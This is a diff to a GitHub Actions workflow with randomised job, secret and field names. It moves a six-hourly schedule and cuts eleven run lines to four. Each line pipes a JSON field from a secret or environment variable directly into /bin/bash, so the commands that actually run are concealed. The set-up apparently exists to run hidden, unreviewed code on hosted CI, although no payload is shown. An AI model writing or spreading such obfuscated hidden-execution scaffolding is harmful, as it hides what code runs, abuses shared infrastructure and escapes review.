@@ -1,9 +1,9 @@
 name: leidate7890
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '18 1/6 * * *'
-
+    - cron: '8 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,17 +12,10 @@ jobs:
       - uses: actions/checkout@v4
       - name: leidate7890
         env:
-          jgqt271: ${{ secrets.jgqt271 }}
+          dlkf511: ${{ secrets.dlkf511 }}
         run: |
-          echo $jgqt271 | jq -r .zknas0905 | /bin/bash
-          echo $ixgek12075 | jq -r .p6 | /bin/bash
-          echo $n7311 | jq -r .ov394 | /bin/bash
-          echo $csc4 | jq -r .y0 | /bin/bash
-          echo $ppku2 | jq -r .dt3516 | /bin/bash
-          echo $mbo675 | jq -r .t8 | /bin/bash
-          echo $d3 | jq -r .pea47 | /bin/bash
-          echo $y7365 | jq -r .q077 | /bin/bash
-          echo $tp62480 | jq -r .oga2 | /bin/bash
-          echo $xprs7662 | jq -r .ohuw58 | /bin/bash
-          echo $yl862 | jq -r .yskdd267 | /bin/bash
+          echo $dlkf511 | jq -r .ptaa517 | /bin/bash
+          echo $wl546 | jq -r .tgaj40 | /bin/bash
+          echo $epz8 | jq -r .aww2708 | /bin/bash
+          echo $twlgw0928 | jq -r .jilrt6 | /bin/bash
 
